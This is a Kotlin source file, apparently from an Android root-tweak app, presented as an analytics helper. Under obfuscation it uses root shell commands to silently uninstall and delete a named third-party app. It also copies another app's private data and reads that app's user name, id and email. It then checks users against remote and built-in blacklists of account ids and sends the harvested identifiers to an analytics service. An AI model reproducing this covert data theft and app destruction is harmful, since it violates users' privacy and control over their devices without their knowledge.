package com.luckyzyx.luckytool.utils

import android.app.Application
import android.content.Context
import android.util.ArrayMap
import com.drake.net.Get
import com.drake.net.utils.scope
import com.drake.net.utils.scopeNet
import com.drake.net.utils.withDefault
import com.joom.paranoid.Obfuscate
import com.luckyzyx.luckytool.BuildConfig
import com.microsoft.appcenter.AppCenter
import com.microsoft.appcenter.analytics.Analytics
import com.microsoft.appcenter.crashes.Crashes
import com.tencent.mmkv.MMKV
import com.topjohnwu.superuser.ShellUtils
import kotlinx.coroutines.Dispatchers
import org.json.JSONArray
import org.json.JSONObject

@Obfuscate
object AppAnalyticsUtils {

    private const val normalAppCenterSecret = BuildConfig.APP_CENTER_SECRET
    private const val betaAppCenterSecret = BuildConfig.APP_CENTER_SECRET_BETA

    private var qss = ArrayList<String>()
    private var css = ArrayList<String>()
    private var gid = ""

    val forbiddenAppList = arrayOf("com.Sunshine.ToolBox")

    fun Application.init(isBeta: Boolean) {
        if (isBeta) AppCenter.start(
            this, betaAppCenterSecret, Analytics::class.java, Crashes::class.java
        )
        else AppCenter.start(
            this, normalAppCenterSecret, Analytics::class.java, Crashes::class.java
        )
    }

    @Suppress("MemberVisibilityCanBePrivate")
    fun trackEvent(name: String, data: Map<String, String>? = null) {
        if (data != null) Analytics.trackEvent(name, data)
        else Analytics.trackEvent(name)
    }

    private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
        val map = ArrayMap<String, String>()
        return try {
            val appInfo = PackageUtils(packageManager).getApplicationInfo(
                "com.magicalstory.AppStore", 0
            ) ?: return ArrayMap<String, String>()
            if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
            ShellUtils.fastCmd(
                "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
            )
            val path = MMKV.initialize(this, "$cacheDir/mmkv")
            if (isDebug) LogUtils.i("MMKV", "initialize", path, true)

            val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
            val name = mmkv.decodeString("name")
            if (isDebug) LogUtils.i("MMKV", "name", "$name", true)
            val userId = mmkv.decodeString("user_id")
            if (isDebug) LogUtils.i("MMKV", "userId", "$userId", true)
            val email = mmkv.decodeString("email")
            if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
            mmkv.close()
            map["$userId"] = "$name | $userId | $email"
            map
        } catch (t: Throwable) {
            LogUtils.i("MMKV", "error", "$t", true)
            map
        }
    }

    fun isAppForbidden(packName: String): Boolean {
        forbiddenAppList.forEach {
            if (it.lowercase() == packName.lowercase()) {
                return true
            }
        }
        return false
    }

    fun checkAppForbiddenList() {
        scopeNet {
            forbiddenAppList.forEach {
                val map = getPackageAbsolutePath(it, true)
                map.toList().forEachIndexed { _, pair ->
                    val packName = pair.first
                    uninstallApp(packName)
                }
            }
            forbiddenAppList.forEach {
                getPackageAbsoluteDir(it, true).forEachIndexed { _, dir ->
                    FileUtils.forceDeleteFile(dir)
                }
            }
        }.catch {
            LogUtils.e("check forbid", "throw", "$it", true)
            return@catch
        }
    }

    fun Context.checkGitlabBlackList(isDebug: Boolean = false) {
        scopeNet {
            val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
            val getDoc = Get<String>(latestUrl).await()
            if (getDoc.isNotBlank()) {
//                LogUtils.e("checkGitlabBlackList", "remote", getDoc, true)
                startCheckList("remote", getDoc, "", isDebug)
            }
        }.catch {
            LogUtils.e("check gitlab", "throw", "$it", true)
            startLocalCheckList(isDebug)
        }
    }

    private fun Context.saveBlackList(original: String) {
        scope(dispatcher = Dispatchers.Default) {
            val remoteJsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
            val remoteJson = safeOfNull { JSONObject(remoteJsonData) } ?: JSONObject()
            val remoteUpdateTime = remoteJson.optString("updateTime")
            if (remoteUpdateTime.isNotBlank()) {
                val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
                val localFinalData = safeOfNull { AESCrypt.decrypt(localOriginal) } ?: ""
//                LogUtils.d("getLocalBlackList", "original", original, true)
                val localJson = safeOfNull { JSONObject(localFinalData) } ?: JSONObject()
                val localUpdateTime = localJson.optString("updateTime")
                if (remoteUpdateTime != localUpdateTime) {
                    ShellUtils.fastCmd("echo $original > /data/local/tmp/luckys/data.dat")
                }
            } else {
                startLocalCheckList()
            }
        }
    }

    private fun Context.startCheckList(
        tag: String, original: String, jsonstring: String, isDebug: Boolean = false
    ) {
        scope(dispatcher = Dispatchers.Default) {
            if (isDebug) LogUtils.e(
                "startCheckList", tag, "${original.isNotBlank()} | ${jsonstring.isNotBlank()}", true
            )
            if (original.isNotBlank()) saveBlackList(original)

            var qbsval = false
            var cbsval = false
            var disval = false
            var magval = false
            val map = ArrayMap<String, String>()
            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")

            initAllBlackIds(isDebug)

            var decryptJson = safeOfNull { AESCrypt.decrypt(original) } ?: ""
            if (tag == "builtIn") decryptJson = jsonstring
            val js = safeOfNull { JSONObject(decryptJson) } ?: JSONObject()
            if (isDebug) LogUtils.e("check", tag, "${decryptJson.ifBlank { null }}", true)

            if (original.isBlank()) {
                if (jsonstring.isBlank() || js.length() <= 0) {
                    startBuiltInCheckList(isDebug)
                }
                return@scope
            }

            (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
                qss.forEach {
                    if (isDebug) LogUtils.e("check qbk", "for", "$this | $it", true)
                    if (contains(it)) {
                        qbsval = true
                        map["qbk"] = it
                    }
                }
            }
            (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
                css.forEach {
                    if (isDebug) LogUtils.e("check cbk", "for", "$this | $it", true)
                    if (contains(it)) {
                        cbsval = true
                        map["cbk"] = it
                    }
                }
            }
            (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
                if (isDebug) LogUtils.e("check dik", "for", "$this | $gid", true)
                if (contains(gid)) {
                    disval = true
                    map["dik"] = gid
                }
            }
            (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
                val list = checkMagicalStory()
                if (isDebug) LogUtils.e("check mag", "list", "$this | $list", true)
                if (list.isNotEmpty()) list.keys.forEach {
                    if (contains(it)) {
                        magval = true
                        map["mag"] = list[it]
                    }
                }
            }
            if (qbsval || cbsval || disval || magval) {
                trackEvent("bk", map)
                removeModule()
                exitModule()
            }
        }.catch {
            LogUtils.e("check list", tag, "$it")
        }
    }

    private fun Context.startLocalCheckList(isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
//                LogUtils.d("getLocalBlackList", "original", original, true)
            startCheckList("local", localOriginal, "", isDebug)
        }
    }

    private fun Context.startBuiltInCheckList(isDebug: Boolean = false) {
        val json = JSONObject().apply {
            put("qbk", JSONArray().apply {
                put("1150325619")
                put("3108440182")
                put("3431299059")
                put("907989054")
                put("1933582367")
                put("382973352")
                put("1204528865")
                put("2515287786")
                put("1848589411")
            })
            put("cbk", JSONArray().apply {
                put("1304480")
                put("16149908")
                put("27708445")
                put("2470014")
                put("19996229")
                put("6759474")
                put("30135990")
            })
            put("dik", JSONArray().apply {
                put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
            })
            put("magical", JSONArray().apply {

            })
        }
        startCheckList("builtIn", "", json.toString(), isDebug)
    }

    private suspend fun initAllBlackIds(isDebug: Boolean = false) {
        withDefault {
            if (qss.isEmpty()) qss = getQSlist()
            if (isDebug) LogUtils.e("check", "getQSlist", "${qss.toList()}", true)
            if (css.isEmpty()) css = getCSid()
            if (isDebug) LogUtils.e("check", "getCSid", "${css.toList()}", true)
            if (gid.isEmpty()) gid = getGuid
            if (isDebug) LogUtils.e("check", "getGuid", gid, true)
        }
    }
}